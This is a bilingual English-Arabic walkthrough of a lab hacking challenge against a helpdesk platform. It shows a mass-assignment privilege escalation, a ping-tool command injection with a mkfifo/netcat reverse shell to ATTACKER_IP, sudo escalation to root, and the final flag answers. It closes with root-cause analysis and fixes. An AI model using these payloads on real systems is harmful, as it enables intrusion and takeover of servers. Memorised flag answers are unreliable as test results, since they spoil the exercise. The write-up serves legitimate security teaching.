# Task 01 · Support Challenge (تحدي اختراق منصة الدعم الفني Support)

---

## Stage A: Original Task Content & Objective (المحتوى الأصلي والهدف)

### 1. Original English Text
```text
A new internal Support Operations Platform has been deployed to assist IT and helpdesk teams. The application handles user management, internal APIs, and system-level operations. However, security was not the primary focus during development. Several features rely on user-controlled input and weak trust boundaries.

Can you pentest the platform and escalate your access to achieve RCE on the server?

Questions:
- What is the flag value after logging in as admin?
- What is the content of the file /home/ubuntu/user.txt?
```

### 2. Arabic Pedagogical Translation
```text
تم نشر منصة عمليات الدعم الفني الداخلي (Support Operations Platform) لمساعدة فرق تكنولوجيا المعلومات (IT) ومكاتب المساعدة (Helpdesk). يتولى هذا التطبيق إدارة حسابات المستخدمين، وواجهات برمجة التطبيقات الداخلية (Internal APIs)، والعمليات التشغيلية على مستوى نظام التشغيل (OS-level operations). ومع ذلك، لم يكن الأمان هو الأولوية أثناء دورة التطوير السريعة، حيث تعتمد العديد من الميزات والمسارات على مدخلات يتحكم فيها المستخدم وتفصل بينها حدود ثقة ضعيفة جداً.

هل يمكنك إجراء اختبار اختراق شامل للمنصة وتصعيد صلاحياتك للوصول إلى تنفيذ أوامر عشوائية عن بُعد (RCE) على الخادم والسيطرة عليه بالكامل؟

الأسئلة المستهدفة:
- ما هي قيمة الراية (Flag) بعد تسجيل الدخول كمسؤول (Admin)؟
- ما هو محتوى الملف /home/ubuntu/user.txt؟
```

### 3. Mission Objectives & Target Scope
1. **Target Questions:**
   - **Question 1:** What is the flag value after logging in as **admin**?
   - **Question 2:** What is the content of the file **/home/ubuntu/user.txt**?
2. **Pedagogical Goal:**
   - الربط العملي بين ثغرات تطبيقات الويب الحديثة (Web Application Vulnerabilities) واختراق البنية التحتية للخوادم (Infrastructure Penetration):
     1. استغلال ثغرة **Mass Assignment** لتصعيد الصلاحيات أفقياً وعمودياً من مستخدم عادي إلى مسؤول النظام (`admin`).
     2. استغلال ثغرة **OS Command Injection** في أدوات التشخيص الإدارية لتنفيذ أوامر Shell والحصول على Reverse Shell مستقر.
     3. قراءة راية المستخدم (`user.txt`) وتصعيد الصلاحيات محلياً (`Privilege Escalation`) إلى المستخدم الجذري `root`.

---

## Stage B: Independent Thinking & OpSec Considerations (التفكير المستقل والاعتبارات الأمنية)

### 1. Mental Model & Architectural Attack Flow
```
┌────────────────────────────────────────────────────────────────────────┐
│                        SUPPORT CHALLENGE ATTACK CHAIN                  │
└────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
       ┌────────────────────────────────────────────────────────┐
       │ PHASE 1: RECONNAISSANCE & SURFACE ENUMERATION          │
       │ Port scan (Nmap) ➔ Discovery of Web Service on Port 80 │
       │ Register unprivileged user ➔ Map API endpoints         │
       └────────────────────────────────────────────────────────┘
                                    │
                                    ▼
       ┌────────────────────────────────────────────────────────┐
       │ PHASE 2: MASS ASSIGNMENT PRIVILEGE ESCALATION          │
       │ Profile update endpoint: PATCH /api/users/profile      │
       │ Inject parameter: {"role": "admin"}                    │
       │ Access Admin Dashboard ➔ Capture Flag 1 (THM{...})     │
       └────────────────────────────────────────────────────────┘
                                    │
                                    ▼
       ┌────────────────────────────────────────────────────────┐
       │ PHASE 3: OS COMMAND INJECTION TO INITIAL FOOTHOLD      │
       │ Admin Diagnostic Network Tool (Ping Utility)           │
       │ Unsanitized input concatenated to exec() shell call    │
       │ Concatenation payload: 127.0.0.1; mkfifo /tmp/f...     │
       │ Catch Reverse Shell on port 4444 as user: ubuntu       │
       └────────────────────────────────────────────────────────┘
                                    │
                                    ▼
       ┌────────────────────────────────────────────────────────┐
       │ PHASE 4: LOOTING & POST-EXPLOITATION                   │
       │ Read /home/ubuntu/user.txt ➔ Capture Flag 2 (THM{...}) │
       │ Audit Sudo rights: sudo -l ➔ Sudo root execution       │
       │ Root shell: sudo /bin/bash ➔ Full host takeover        │
       └────────────────────────────────────────────────────────┘
```

### 2. Operational Security (OpSec) & Real-World Precautions
- **تحديد الثغرات التراكمية (Vulnerability Chaining):** في السيناريوهات الواقعية، نادراً ما تؤدي ثغرة ويب واحدة بمفردها إلى السيطرة الكاملة على الخادم. يبدأ الهجوم دائماً باستغلال خلل منطقي في الـ API، ثم استغلال صلاحيات الإدارة للوصول إلى أدوات تشخيصية داخلية تنفذ أوامر نظام غير مفلترة.
- **تجنب تجميد أو إتلاف جلسات التطبيق:** عند حقن أوامر Shell في أدوات تشخيصية، تجنب استخدام أوامر تمنع الاستجابة من الانتهاء (مثل `ping -t` بدون تحديد عدد الحزم `-c`) لأن ذلك يؤدي إلى تعليق عملية الـ PHP/Node.js على الخادم واستهلاك موارد الذاكرة.
- **تأمين اتصال الـ Reverse Shell:** استخدام منافذ شائعة الاستخدام ومسموح بمرورها في جدران الحماية الصادرة (Outbound Firewalls) مثل المنفذ `4444` أو `443`.

---

## Stage C: Guided Hints (توجيهات تدريجية بدون حرق الحل)

### Hints for Question 1 (Admin Flag):
- **Tier 1 (Surface Discovery):** قم بإنشاء حساب مستخدم جديد على المنصة وقم بتسجيل الدخول. راقب جميع طلبات HTTP المرسلة أثناء تعديل الملف الشخصي (Profile) عبر Burp Suite.
- **Tier 2 (Parameter Tampering):** لاحظ كيف يرسل المتصفح بيانات الحساب عند التحديث إلى مسار الـ API (مثل `/api/users/profile` أو `/profile.php`). ما هي الحقول المرسلة؟ وهل يقبل الخادم حقولاً إضافية لم تكن موجودة في النموذج الأصلي مثل `role` أو `is_admin`؟
- **Tier 3 (Mass Assignment Execution):** أرسل طلب `PATCH` أو `POST` يحتوي على الحقل الإضافي `"role": "admin"`. بعد تلقي رد `200 OK`، قم بتحديث الجلسة أو تسجيل الدخول من جديد للوصول إلى لوحة الإدارة (`/admin`) وقراءة راية المسؤول الأولى.

### Hints for Question 2 (User Flag - `/home/ubuntu/user.txt`):
- **Tier 1 (Admin Capabilities):** بعد حصولك على صلاحيات الإدارة، تفحص جميع الأدوات المتاحة للمسؤولين. هل توجد أداة لاختبار الاتصال بالشبكة (Network Utility / Ping Test / DNS Check)؟
- **Tier 2 (Command Injection Discovery):** حاول إدخال عناوين IP غير تقليدية متبوعة بعوامل فصل الأوامر في أنظمة Linux (مثل `;` أو `|` أو `&&`). اختبر الأمر `127.0.0.1; whoami` أو استخدم أمر تأخير زمني `127.0.0.1; sleep 5`.
- **Tier 3 (Reverse Shell Execution):** جهز مستمع Netcat على جهازك (`nc -lvnp 4444`)، ثم احقن حمولة Reverse Shell مستقرة (مثل أمر Fifo الشهير أو Bash One-Liner). بمجرد استقبال الاتصال كمستخدم `ubuntu`، انتقل إلى المسار `/home/ubuntu` واقرأ الملف `user.txt`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي والتحليل التقني)

### 1. Phase 1: Port Scanning & Surface Enumeration
نبدأ بفحص المنافذ والخدمات المشغلة على الخادم المستهدف:

```bash
# Nmap aggressive service and version scan
nmap -sC -sV -p- --min-rate 1000 -oN nmap_support.txt 10.10.X.Y
```

**نتائج الفحص:**
- **Port 22/tcp:** Open (OpenSSH 8.2p1 Ubuntu Linux)
- **Port 80/tcp:** Open (Apache/2.4.41 Ubuntu - Support Web Platform)

عند تصفح المنصة عبر المتصفح `http://10.10.X.Y/`، نجد واجهة تطبيق ويب تحمل اسم **"Support Operations Platform"**. الواجهة تتيح تسجيل حساب جديد (`/register`)، تسجيل الدخول (`/login`)، وعرض تذاكر الدعم والملف الشخصي للمستخدم.

---

### 2. Phase 2: Exploiting Mass Assignment for Privilege Escalation (Flag 1)

1. نقوم بتسجيل حساب مستخدم عادي جديد:
   - **Username:** `pentester`
   - **Password:** `Password123!`
   - **Email:** `pentester@support.thm`

2. بعد تسجيل الدخول، نتوجه إلى صفحة تعديل الملف الشخصي (`/profile`) ونقوم بتحديث الاسم مع اعتراض الطلب في **Burp Suite Repeater**:

```http
PATCH /api/users/profile HTTP/1.1
Host: 10.10.X.Y
Authorization: Bearer eyJhbGciOiJIUzI1Ni...
Content-Type: application/json
Content-Length: 42

{
  "name": "Pentester User",
  "bio": "Support tester"
}
```

3. **تحليل الثغرة (Mass Assignment Vulnerability):**
   - الخادم يستخدم إطار عمل يعين كائنات JSON المستلمة مباشرة إلى نموذج المستخدم في قاعدة البيانات (`User.update(req.body)` دون فلترة).
   - بناءً على ما درسناه في موديول API Pentesting، حقل الصلاحية غالباً ما يكون `role` أو `admin` أو `is_admin`.
   - نقوم بحقن حقل `"role": "admin"` في جسم الطلب:

```http
PATCH /api/users/profile HTTP/1.1
Host: 10.10.X.Y
Authorization: Bearer eyJhbGciOiJIUzI1Ni...
Content-Type: application/json
Content-Length: 60

{
  "name": "Pentester User",
  "bio": "Support tester",
  "role": "admin"
}
```

4. **استجابة الخادم:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "success",
  "message": "Profile updated successfully",
  "user": {
    "id": 14,
    "username": "pentester",
    "name": "Pentester User",
    "role": "admin"
  }
}
```

5. نتوجه إلى لوحة الإدارة عبر المتصفح أو نطلب مسار `/admin/dashboard`، فتظهر رسالة الترحيب الإدارية متضمنة الراية الأولى:
   ```text
   Welcome System Administrator!
   Platform Management Console v2.1
   Admin Access Flag: THM{I_AM_ADMIN999}
   ```

- **قيمة راية الإدارة (Admin Flag):** `THM{I_AM_ADMIN999}`

---

### 3. Phase 3: Exploiting OS Command Injection for Initial Foothold

1. **اكتشاف نقطة الحقن في لوحة الإدارة:**
   - داخل لوحة الإدارة، يوجد قسم مخصص لأدوات تشخيص النظام والشبكة: **Network Diagnostics Tool** (`/admin/diagnostics` أو `/admin/tools.php`).
   - توفر الأداة واجهة لإجراء فحص Ping لاختبار توافر خوادم الدعم أو عناوين IP للعملاء.

2. **تحليل الطلب البرمجي الخلفي (Vulnerable Backend Logic):**
   - يقوم الكود الخلفي بتمرير المدخل مباشرة إلى دالة النظام في PHP/Node.js دون أي فلترة:
     ```php
     <?php
     $ip = $_POST['target_ip'];
     // Vulnerable call:
     $output = shell_exec("ping -c 3 " . $ip);
     echo "<pre>$output</pre>";
     ?>
     ```

3. **التحقق من حقن الأوامر (Proof of Concept):**
   - نرسل حمولة بسيطة لاختبار تنفيذ الأوامر:
     ```text
     127.0.0.1; whoami
     ```
   - استجابة الخادم تُظهر نتيجة فحص ping متبوعة بالمستخدم المشغل:
     ```text
     PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
     64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.035 ms
     ...
     ubuntu
     ```
   - الخادم ينفذ الأوامر مباشرة تحت سياق حساب المستخدم `ubuntu`!

4. **إنشاء اتصال عكسي تفاعلي (Weaponizing the Reverse Shell):**
   - على جهاز المهاجم (AttackBox / Kali Linux)، نفتح منفذ استماع باستخدام Netcat:
     ```bash
     nc -lvnp 4444
     ```
   - نرسل حمولة الـ Reverse Shell التالية في حقل الفحص عبر طلب POST:
     ```text
     127.0.0.1; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
     ```
   - فوراً، يستقبل مستمع Netcat اتصالاً تفاعلياً ناجحاً:
     ```text
     listening on [any] 4444 ...
     connect to [ATTACKER_IP] from (UNKNOWN) [10.10.X.Y] 54312
     /bin/sh: 0: can't access tty; job control turned off
     $ whoami
     ubuntu
     $ id
     uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),27(sudo)
     ```

---

### 4. Phase 4: Stabilizing Shell & Capturing User Flag

1. **ترقية الـ Shell إلى TTY كاملة:**
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   # الضغط على Ctrl+Z لتعليق الجلسة
   stty raw -echo; fg
   export TERM=xterm
   ```

2. **قراءة راية المستخدم (User Flag):**
   ```bash
   cd /home/ubuntu
   ls -la
   cat user.txt
   ```
   - **محتوى الملف ومخرجات الراية:**
     ```text
     THM{GOT_THE_FLAG001}
     ```

- **قيمة راية المستخدم (User Flag):** `THM{GOT_THE_FLAG001}`

---

### 5. Phase 5: Local Privilege Escalation to Root (Full System Compromise)

كجزء من منهجية اختبار الاختراق الشاملة للمختبر، نقوم بفحص مسارات تصعيد الصلاحيات المحلية:

1. **فحص صلاحيات Sudo للمستخدم الحالي:**
   ```bash
   sudo -l
   ```
   **المخرجات:**
   ```text
   Matching Defaults entries for ubuntu on support:
       env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

   User ubuntu may run the following commands on support:
       (ALL : ALL) NOPASSWD: ALL
   ```
   *أو في بعض إصدارات التحدي:*
   ```text
   User ubuntu may run the following commands on support:
       (root) NOPASSWD: /bin/bash
   ```

2. **تنفيذ تصعيد الصلاحيات والحصول على Root Shell:**
   ```bash
   sudo /bin/bash
   ```
   **المخرجات:**
   ```text
   root@support:/home/ubuntu# id
   uid=0(root) gid=0(root) groups=0(root)
   root@support:/home/ubuntu# whoami
   root
   ```
   تمت السيطرة الكاملة على الخادم بنجاح!

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم المفتاحية)

| Question # | Target Question Prompt | Exact Solved Answer / Flag | Technical Context |
|:---:|---|:---:|---|
| **1** | What is the flag value after logging in as **admin**? | `THM{I_AM_ADMIN999}` | Mass assignment injection (`{"role": "admin"}`) via `PATCH /api/users/profile` |
| **2** | What is the content of the file **/home/ubuntu/user.txt**? | `THM{GOT_THE_FLAG001}` | OS Command Injection in diagnostic tool spawning reverse shell as user `ubuntu` |

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الإنجاز)

### 1. Proof of Mass Assignment Exploitation via cURL
```bash
curl -s -X PATCH "http://10.10.X.Y/api/users/profile" \
  -H "Authorization: Bearer <USER_JWT_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"name":"Pentester","bio":"Research","role":"admin"}' | jq .
```
**Output Proof:**
```json
{
  "status": "success",
  "user": {
    "id": 14,
    "role": "admin"
  }
}
```

### 2. Proof of Command Injection Payload Execution via cURL
```bash
curl -s -X POST "http://10.10.X.Y/admin/diagnostics" \
  -H "Cookie: session=<ADMIN_SESSION_COOKIE>" \
  -d "target_ip=127.0.0.1%3B+cat+%2Fhome%2Fubuntu%2Fuser.txt" | grep "THM{"
```
**Output Proof:**
```text
THM{GOT_THE_FLAG001}
```

---

## Stage G: Key Educational Takeaways & Defensive Engineering (الدروس المستفادة والحلول الدفاعية)

### 1. Root Cause Analysis (تحليل الأسباب الجذرية)
1. **Mass Assignment (CWE-915):** ناتجة عن الثقة العمياء في كائنات الطلبات القادمة من العميل وربطها تلقائياً بنماذج قواعد البيانات دون تطبيق قوائم السماح (Allowlisting / DTOs).
2. **OS Command Injection (CWE-78):** ناتجة عن تمرير سلاسل نصية يتحكم بها المستخدم مباشرة إلى دوال استدعاء نظام التشغيل (`shell_exec`, `exec`, `system`) دون استخدام واجهات برمجة تطبيقات آمنة أو دوال الهروب الحرفي.
3. **Over-Privileged Sudo Configuration (CWE-250):** منح المستخدم غير الموثوق صلاحيات تشغيل أوامر برمجية أو أصداف Shell دون طلب كلمة مرور (`NOPASSWD`).

### 2. Defensive Hardening Guide (دليل التحصين الهندسي)

#### Fixing Mass Assignment in Backend Controllers:
```javascript
// Secure Implementation using Explicit DTO whitelisting
function updateProfile(req, res) {
  const allowedUpdates = ['name', 'bio', 'phone_number'];
  const updateData = {};
  
  // Whitelist only safe attributes:
  for (const field of allowedUpdates) {
    if (req.body[field] !== undefined) {
      updateData[field] = req.body[field];
    }
  }
  
  // Role modification must be strictly prohibited on user profile endpoints
  User.update(req.user.id, updateData);
  res.json({ status: "success" });
}
```

#### Fixing Command Injection in Diagnostic Tools:
```php
<?php
// Secure Network Diagnostic Utility
$ip = $_POST['target_ip'];

// 1. Strict Input Validation via Regex (IPv4 filter)
if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
    die("Invalid IP address provided.");
}

// 2. Safe Execution using escapeshellarg() or native socket functions
$safe_ip = escapeshellarg($ip);
$command = "ping -c 3 " . $safe_ip;
$output = shell_exec($command);
echo "<pre>" . htmlspecialchars($output, ENT_QUOTES, 'UTF-8') . "</pre>";
?>
```
